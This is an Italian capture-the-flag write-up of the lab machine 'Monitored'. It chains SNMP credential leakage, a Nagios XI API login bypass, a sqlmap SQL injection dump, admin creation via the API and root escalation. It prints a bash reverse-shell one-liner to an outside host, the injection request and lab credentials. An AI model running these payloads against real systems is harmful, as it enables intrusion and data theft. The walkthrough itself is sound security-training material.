+++
date = '2026-08-17T14:16:26+02:00'
draft = false
title = 'Monitored Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`09/03/2025`**

![pwn.jpeg](/images/imgs_monitored/pwn.jpeg)

---
# Introduzione

**_Monitored_** è una macchina **Linux** di livello **Medium** molto impegnativa, fortemente incentrata sulla **Web Exploitation** manuale.

Il foothold iniziale richiede di concatenare diversi passaggi: eseguire un'enumerazione **SNMP** per scoprire credenziali, abusare di un endpoint API di **Nagios XI** per bypassare l'autenticazione e sfruttare una **SQL Injection** (**CVE-2023-40931**) per estrarre delle **API key** amministrative.

Da qui, la creazione di un nuovo utente permette di scalare i privilegi e diventare amministratori all'interno dell'applicazione web interagendo con le **API** del backend, cosa che ci permette di ottenere una **Remote Code Execution**. La privilege escalation si può ottenere abusando di diverse **sudo misconfiguration** o sfruttando una vulnerabilità molto recente (**Copy-Fail - CVE-2026-31431**).

---
# Tecniche Utilizzate

- **SNMP Data Extraction**

- **API Authentication Bypass**

- **SQL Injection (CVE-2023-40931)**

- **API Abuse for Privilege Escalation**

- **Sudo Misconfigurations / CVE-2026-31431 (Copy-Fail)**

---
# Enumeration

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- monitored
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV monitored
```

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http     Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.56
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP (Redirects to HTTPS)

- **389**/tcp - LDAP

- **443**/tcp - HTTPS (Nagios XI)

Ho aggiunto **`nagios.monitored.htb`** al mio file **`/etc/hosts`**.

## Enumerazione HTTP & LDAP

Ho iniziato la fase di enumerazione dal web server. Sono stato reindirizzato alla pagina di login di **Nagios XI**.

![web1.png](/images/imgs_monitored/web1.png)

Ho cercato su **Google** credenziali di default, ma **Nagios XI** non ne ha di standard. Tuttavia, ho comunque provato le classiche combinazioni come **`nagiosadmin:nagiosxi`** e **`root:nagiosxi`**, senza successo.

![web2.png](/images/imgs_monitored/web2.png)

Ho usato **searchsploit** per cercare **CVE** note relative a **Nagios XI**, ma non ho trovato nulla di immediatamente sfruttabile senza un foothold iniziale o un numero di versione preciso.
Andando avanti, ho provato a enumerare il servizio **LDAP** sulla porta **389** usando **ldapsearch**, ma non sono riuscito ad estrarre nulla.

A questo punto, sono tornato sull'istanza **Nagios**. Ho scavato più a fondo tra le **CVE** e ho lanciato **Gobuster** in background per brute-forzare le directory, ma continuavo a non trovare assolutamente nulla.
Essendo completamente bloccato sul fronte **TCP**, ho deciso di ampliare la prospettiva e lanciare una scansione sulle porte **UDP**.

## Enumerazione UDP 

```bash
nmap -sU -p 161,162,500,4500 -sV --min-rate 200 --max-retries 2 monitored
```

```text
PORT     STATE  SERVICE   VERSION
161/udp  open   snmp      SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp  open   snmp      net-snmp
500/udp  closed isakmp
4500/udp closed nat-t-ike
```

Servizio **SNMP** sulla porta **161** con la community string pubblica.

---
# Accesso Iniziale | Da SNMP alla SQLi

# Analisi degli Errori & Scoperta dell'API

Interrogando il servizio **SNMP** tramite **snmpwalk**, sono riuscito a estrarre una stringa contenente informazioni sensibili legata ad un processo in esecuzione:

```bash
snmpwalk -v 2c -c public monitored
```

![snmp1.png](/images/imgs_monitored/snmp1.png)

Avevo un potenziale utente (**svc**) e quella che sembrava essere una password o un token (**`XjH7VCehowpR1xZB`**).

![snmp2.png](/images/imgs_monitored/snmp2.png)

Il mio primo pensiero è stato usarle per loggarmi tramite **SSH**, Permission Denied.

![ssh_fail.png](/images/imgs_monitored/ssh_fail.png)

Sono tornato sul pannello di **Nagios XI** e ho provato a fare l'accesso. Pur non riuscendo a entrare, ho potuto notare come i messaggi d'errore dell'applicazione cambiassero a seconda dell'input:

```text
# Using svc:password
Invalid username or password.

# Using svc:XjH7VCehowpR1xZB
The specified user account has been disabled or does not exist.
```

![error_change.png](/images/imgs_monitored/error_change.png)

Questa discrepanza è stata un grandissimo indizio: probabilmente le credenziali erano valide, ma l'utente **svc** era stato disabilitato o non era autorizzato ad accedere all'interfaccia web.

Essendo di nuovo bloccato, sono tornato su **searchsploit** e ho iniziato ad analizzare gli exploit per **Nagios XI** uno ad uno. Ho trovato uno specifico exploit per una **SQL Injection** che puntava a un **endpoint API**: **`nagiosxi/api/v1/authenticate`**.

![sql1.png](/images/imgs_monitored/sql1.png)

Ho avviato **Burpsuite** per testare manualmente questo endpoint. Non appena ho inviato una richiesta a http://nagios.monitored.htb/nagiosxi/api/v1/authenticate usando le credenziali **svc**, il server ha risposto con un token di autenticazione valido: **`761a24b4b2c9b8699ff0d9d560f8e64e0d882a33`**.

![sql2.png](/images/imgs_monitored/sql2.png)

Secondo la logica dell'exploit, potevo bypassare completamente il login aggiungendo questo token direttamente all'**URL**:
- **http://nagios.monitored.htb/nagiosxi/login.php?token=761a24b4b2c9b8699ff0d9d560f8e64e0d882a33**

![sql3.png](/images/imgs_monitored/sql3.png)

Mi sono loggato.

![web_logged.png](/images/imgs_monitored/web_logged.png)

## SQL Injection (CVE-2023-40931)

Una volta dentro, ho identificato la versione di **Nagios XI**: **`5.11.0`**.

![version.png](/images/imgs_monitored/version.png)

Una rapida ricerca ha rivelato che questa versione è vulnerabile alla **CVE-2023-40931**, una **SQL Injection** autenticata situata nell'endpoint **`banner_message-ajaxhelper.php`**.

Ho intercettato la seguente richiesta **POST** con **Burpsuite**:

```text
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=dkocce8s3jktgros1bbhnme7rh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

action=acknowledge_banner_message&id=*
```

Il server ha risposto con un errore di sintassi, confermando l'injection:

![sql4.png](/images/imgs_monitored/sql4.png)

Ho salvato la richiesta in un file (**`req.req`**) e l'ho data in pasto a **sqlmap**.
Mentre aspettavo che l'attacco **time-based** finisse, ho studiato la struttura del database. Di default, archivia gli utenti nella tabella **`xi_users`** all'interno del DB **`nagiosxi`**. Per velocizzare il tool, ho puntato esplicitamente a quei campi:

```bash
sqlmap -r req.req --dbms mysql -D nagiosxi -T xi_users --dump --batch --force-ssl
```

![sql5.png](/images/imgs_monitored/sql5.png)

Il dump ha fornito diversi hash e **API key**.
Ho provato a craccare gli hash ma senza successo, rimanendo temporaneamente bloccato di nuovo. Avevo un'**API key**, ma nessun modo immediato per usarla.

![sql6.png](/images/imgs_monitored/sql6.png)

Ho fatto un passo indietro, ho rivisto tutto il processo e ho analizzato un altro exploit (**`Nagios XI Version 2024R1.01 - multiple/webapps/51925.py`**).

![scsploit1.png](/images/imgs_monitored/scsploit1.png)

---
# Lateral Movement | Dall'abuso API alla RCE

Studiando la logica di questo exploit, ho capito che potevo utilizzare l'**API key** per interagire con il backend e creare un nuovo utente con privilegi amministrativi.

**Nota**: _L'endpoint **`/nagiosxi/api/v1/system/user`** permette agli utenti autorizzati di creare account. Aggiungendo l'**API key** estratta (**`IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`**), possiamo inviare una richiesta **POST** con il parametro **`auth_level=admin`** per elevare il nuovo utente._

![sql7.png](/images/imgs_monitored/sql7.png)

Dopo aver effettuato l'accesso alla piattaforma con **`fallingstr:Stars1%`**, avevo il pieno controllo amministrativo.

![logged_as_new.png](/images/imgs_monitored/logged_as_new.png)

Per ottenere una **Remote Code Execution**, l'exploit originale crea un comando malevolo per lanciare una reverse shell. L'ho riprodotto manualmente:

1. **Sono andato su: Configure -> Advanced Configuration -> Commands -> Add New**.

2. **Ho creato un comando chiamato "fall" con il seguente payload nella Command Line**:
    **`bash -c 'bash -i >& /dev/tcp/10.10.15.152/22667 0>&1'`**

![initial1.png](/images/imgs_monitored/initial1.png)

3. **Sono andato su: Configure --> Advanced Configuration --> Services --> Add New --> Check Command (fall)**.

![inital2.png](/images/imgs_monitored/inital2.png)

4. **Ho cliccato su Run Check Command**.

Il mio listener **netcat** ha immediatamente catturato una reverse shell come utente **nagios**, e ho preso la **user flag**.

![userf.png](/images/imgs_monitored/userf.png)

---
# Privilege Escalation | CVE-2026-31431 (Copy-Fail)

Dopo aver trasferito ed eseguito **`linpeas.sh`**, ho scoperto molteplici percorsi per una privilege escalation verticale.

## L'intended way (Regole Sudo)

```bash
sudo -l
```

L'utente **nagios** possiede un sacco di privilegi **sudo**. Analizzando tutti gli script uno ad uno si rivelano diversi vettori di privilege escalation come: **wildcard expansion**, **path hijacking**, o la **sovrascrittura del binario nagios con codice di reverse shell/leak di chiavi RSA**.

![sudol.png](/images/imgs_monitored/sudol.png)

## Il percorso moderno (CVE-2026-31431)

Tuttavia, **LinPEAS** ha anche flaggato il sistema come vulnerabile alla **CVE-2026-31431**, nota come "**Copy Fail**".

![vuln.png](/images/imgs_monitored/vuln.png)

**Nota**: _Questa vulnerabilità moderna sfrutta una gestione errata dei permessi e race conditions durante specifiche operazioni di copia. Permette a un utente con privilegi bassi di abusare delle utility di sistema per sovrascrivere file sensibili (come **`/etc/shadow`**) o dirottare percorsi di esecuzione privilegiati._

Dato che non l'avevo mai testata prima, ho scelto questa strada per prendere il controllo del sistema. Ho clonato la [repository della PoC](https://github.com/Juguitos/copy-fail), ho trasferito lo script **python**, e l'ho eseguito:

![rootf.png](/images/imgs_monitored/rootf.png)

Lo script mi ha garantito una shell come **root**.

---
# Considerazioni Finali

Non sono un grande fan di questa macchina... specialmente per quanto riguarda il foothold. Ho trovato l'exploitation path per la **SQL Injection** un vero e proprio brainfuck. A sensazione la classifico almeno come una difficoltà "**Hard**".

Alcune persone suggeriscono questa macchina per la preparazione all'**OSCP**. Effettivamente lo è, perché l'exploitation path è quasi interamente manuale. Ma non credo che l'**OSCP** vada così a fondo nelle **SQL injection** manuali. Forse lo dico solo perché non sono riuscito a exploitare la **SQLi** manualmente e mi sono dovuto affidare a **sqlmap**.

Nel complesso, un ottimo box. Mi ha fatto riflettere su molte idee diverse e possibili vettori d'attacco, infatti ci ho messo un bel po' a pwnarla. Mi ha anche fornito un ottimo playground per testare la recente **CVE Copy-Fail** in un ambiente controllato.

**Fonti**:

- **Nagios XI CVE-2023-40931 Deep Dive | https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c**

- **Copy-Fail (CVE-2026-31431) Exploit | https://github.com/Juguitos/copy-fail**
